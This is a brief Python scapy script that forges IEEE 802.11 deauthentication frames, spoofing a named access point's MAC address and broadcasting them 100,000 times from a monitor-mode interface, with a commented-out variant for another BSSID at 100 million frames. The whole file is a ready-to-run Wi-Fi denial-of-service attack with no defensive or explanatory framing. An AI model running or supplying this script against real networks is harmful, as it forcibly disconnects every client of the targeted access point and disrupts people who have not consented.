#!/usr/bin/python3
from scapy.all import *

brdmac = "ff:ff:ff:ff:ff:ff"
# pkt = RadioTap() / Dot11(addr1=brdmac,addr2="C8:3A:35:27:76:A8",addr3="C8:3A:35:27:76:A8")/ Dot11Deauth()
pkt = RadioTap() / Dot11(addr1=brdmac,addr2="1C:18:4A:38:89:E0",addr3="1C:18:4A:38:89:E0")/ Dot11Deauth()
# sendp(pkt,iface="wlan1mon",count=100000000,inter=.2)
sendp(pkt,iface="wlan0mon",count=100000,inter=.2)